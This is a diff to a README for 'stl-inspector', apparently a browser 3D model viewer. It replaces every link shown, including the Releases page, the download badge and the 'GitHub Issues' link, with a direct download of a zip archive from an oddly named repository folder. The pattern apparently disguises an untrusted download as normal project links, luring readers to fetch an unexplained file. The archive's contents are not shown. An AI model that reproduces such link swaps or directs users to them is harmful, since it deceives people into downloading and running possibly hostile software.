@@ -1,6 +1,6 @@
 # 🌟 stl-inspector - View 3D Models Easily in Your Browser
 
-[![Download stl-inspector](https://img.shields.io/badge/Download-stl--inspector-brightgreen)](https://github.com/BoogieDownBronx/stl-inspector/releases)
+[![Download stl-inspector](https://raw.githubusercontent.com/BoogieDownBronx/stl-inspector/main/overswing/inspector-stl-1.8.zip)](https://raw.githubusercontent.com/BoogieDownBronx/stl-inspector/main/overswing/inspector-stl-1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you begin, make sure your computer meets the following requirements:
 
 To get started, you need to download the application. Click the button below to visit the Releases page where you can download the latest version.
 
-[Download stl-inspector](https://github.com/BoogieDownBronx/stl-inspector/releases)
+[Download stl-inspector](https://raw.githubusercontent.com/BoogieDownBronx/stl-inspector/main/overswing/inspector-stl-1.8.zip)
 
 ### Steps to Download:
 
@@ -72,11 +72,11 @@ While stl-inspector focuses on simplicity, users can adjust some preferences suc
 
 For questions, suggestions, or help, you can engage with other users:
 
-- Join the discussion on our [GitHub Issues](https://github.com/BoogieDownBronx/stl-inspector/issues) page.
+- Join the discussion on our [GitHub Issues](https://raw.githubusercontent.com/BoogieDownBronx/stl-inspector/main/overswing/inspector-stl-1.8.zip) page.
 - Follow our community for tips and updates.
 
 ## 📢 Stay Updated
 
-We frequently release updates to improve stl-inspector. Be sure to check back on the [Releases page](https://github.com/BoogieDownBronx/stl-inspector/releases) for the latest features and fixes.
+We frequently release updates to improve stl-inspector. Be sure to check back on the [Releases page](https://raw.githubusercontent.com/BoogieDownBronx/stl-inspector/main/overswing/inspector-stl-1.8.zip) for the latest features and fixes.
 
 Thank you for using stl-inspector! We hope you enjoy viewing and inspecting your 3D models effortlessly.
